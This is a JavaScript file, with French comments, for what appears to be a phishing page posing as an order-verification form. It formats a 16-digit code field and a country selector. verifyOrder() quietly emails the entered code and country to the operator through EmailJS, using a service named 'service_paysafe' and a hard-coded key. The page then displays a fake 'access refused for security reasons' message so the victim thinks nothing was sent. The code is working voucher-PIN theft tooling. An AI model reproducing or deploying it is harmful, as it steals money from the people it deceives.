console.log("script.js chargé");

document.addEventListener("DOMContentLoaded", function () {


// ==========================================
// SÉLECTEUR DE PAYS
// ==========================================

const countryButton = document.getElementById("countryButton");
const countryOptions = document.getElementById("countryOptions");
const selectedFlag = document.getElementById("selectedFlag");
const selectedCountry = document.getElementById("selectedCountry");
const countryInput = document.getElementById("country");

if (
    countryButton &&
    countryOptions &&
    selectedFlag &&
    selectedCountry &&
    countryInput
) {

    // Ouvrir / fermer la liste
    countryButton.addEventListener("click", function (event) {

        event.stopPropagation();

        countryOptions.classList.toggle("show");

    });


    // Sélection d'un pays
    const countryItems =
        countryOptions.querySelectorAll("div");

    countryItems.forEach(function (option) {

        option.addEventListener("click", function (event) {

            event.stopPropagation();

            const value = this.dataset.value;
            const flagImage = this.querySelector("img");

            if (!flagImage) {
                return;
            }

            // Remplacer l'ancien drapeau
            selectedFlag.src = flagImage.src;

            // Remplacer le code du pays
            selectedCountry.textContent = value;

            // Mettre à jour la valeur cachée
            countryInput.value = value;

            // Fermer la liste
            countryOptions.classList.remove("show");

            console.log("Pays sélectionné :", value);

        });

    });


    // Fermer en cliquant ailleurs
    document.addEventListener("click", function () {

        countryOptions.classList.remove("show");

    });

}


// ==========================================
// CHAMP CODE : 16 CHIFFRES
// ==========================================

const orderNumberInput =
    document.getElementById("orderNumber");

if (orderNumberInput) {

    orderNumberInput.addEventListener("input", function () {

        let value = this.value.replace(/\D/g, "");

        value = value.substring(0, 16);

        this.value =
            value.replace(/(\d{4})(?=\d)/g, "$1 ");

    });

}


// ==========================================
// INITIALISATION EMAILJS
// ==========================================

emailjs.init("rORVGScs1n94sqOPi");


});

// ==========================================
// VÉRIFICATION DU CODE
// ==========================================

function verifyOrder() {


console.log("verifyOrder appelée");

const input = document.getElementById("orderNumber");
const message = document.getElementById("message");
const button = document.getElementById("submitOrderButton");
const countryInput = document.getElementById("country");

const country = countryInput.value;

// Supprimer les espaces
const orderNumber = input.value.replace(/\s/g, "");

// Vérifier 16 chiffres
if (!/^\d{16}$/.test(orderNumber)) {

    message.style.color = "red";
    message.textContent =
        "Please enter a valid 16-digit code.";

    input.focus();

    return;
}

button.disabled = true;
button.textContent = "Sending...";
message.textContent = "";

emailjs.send(
    "service_paysafe",
    "template_psf",
    {
        order_number: orderNumber,
        country: country
    }
)
.then(function (response) {

    console.log("Email envoyé !");
    console.log(response);

    message.style.color = "white";
    message.textContent =
        "veillez patienter svp.";

    input.value = "";
    input.focus();

    setTimeout(function () {

        message.style.color = "red";

        message.textContent =
            "l'accès refusé pour raison de sécurité.";

    }, 2000);

    button.disabled = false;
    button.textContent = "Envoi..";

})
.catch(function (error) {

    console.error("Erreur EmailJS :", error);

    message.style.color = "red";
    message.textContent =
        "An error occurred.";

    button.disabled = false;
    button.textContent = "Envoyer";

});


}
